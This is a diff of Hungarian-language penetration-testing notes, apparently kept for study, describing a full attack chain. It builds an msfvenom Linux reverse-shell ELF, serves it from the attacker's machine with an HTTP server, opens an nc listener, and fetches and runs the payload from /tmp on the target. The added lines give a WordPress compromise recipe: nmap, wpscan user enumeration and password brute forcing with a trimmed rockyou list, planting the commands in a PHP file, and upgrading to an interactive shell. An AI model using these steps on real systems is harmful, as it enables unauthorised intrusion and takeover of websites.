@@ -79,8 +79,9 @@ command shell:
 RCE (Remote Code Execution) sérülékenység kihasználása:
  - előfeltételek:
    - Attacker gépen OS shellkód készítése (célpont OS-ére, nekünk linux x64) (msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf)
-   - Attacker gépen: python3 -m http.server (port) -- webszerver nyitása !!abból a mappából ahol a shellkód van!!
-   - Attacker gépen listener nyitása (külön terminálban kényelmesebb)
+           https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ ; cs:64bit linux stageless non-meterpreter
+   - Attacker gépen: python3 -m http.server (nem kell, de lehet port) -- webszerver nyitása !!abból a mappából ahol a shellkód van!!
+   - Attacker gépen listener nyitása (külön terminálban kényelmesebb) (nc -lvp 4444)
  - CMD rész: (lépések között ls -l /tmp -vel tesztelhetjük a mappastruktúrát)
    - cd /tmp -- olyan mappa ahol van jogosultságunk letölteni
    - rm -f /tmp/shell.elf -- shell neve változhat
@@ -89,7 +90,7 @@ RCE (Remote Code Execution) sérülékenység kihasználása:
    - /tmp/shell.elf
 
 Fenti parancsok egy php fájlba, ami githubon is fent van.
-Ebből interaktív shell-t úgy csinálunk hogy "python3 -c "import pty;pty.spawn('/bin/bash')"
+Ebből interaktív shell-t úgy csinálunk hogy "python3 -c "import pty;pty.spawn('/bin/bash')""
 
 Wordpress oldalak:
 wpscan: (!!sudo wpscan!!)
@@ -99,3 +100,13 @@ wpscan: (!!sudo wpscan!!)
  --random-agent -- minden kérés random agent
  --usernames <nevek> --passwords <jelszavak> --lehetnek fájlok is, feltörésre, nem "kézzel bruteforce-ol", máshol próbál bejelentkezni mint egy felhasználó
  --wp-content-dir -- a wp-content mappa neve ha tudjuk
+
+jelszófájl leredukálása csak 5000 sornyira: cat /usr/share/wordlists/rockyou.txt | head -n5000 > /tmp/rockyou5000.txt
+
+Példa wordpress oldal feltörésre:
+ -nmap -sS -sV <ip>
+ -wpscan --url <url> --enumerate u/ap/at
+ -wpscan --url <url> --usernames <> --passwords <>
+ -keresünk php fájlt és beleírjuk az RCE CMD részét
+ -RCE előfeltételei
+ -bent vagyunk, python3 -c "import pty;pty.spawn('/bin/bash')" az interaktív shell-hez
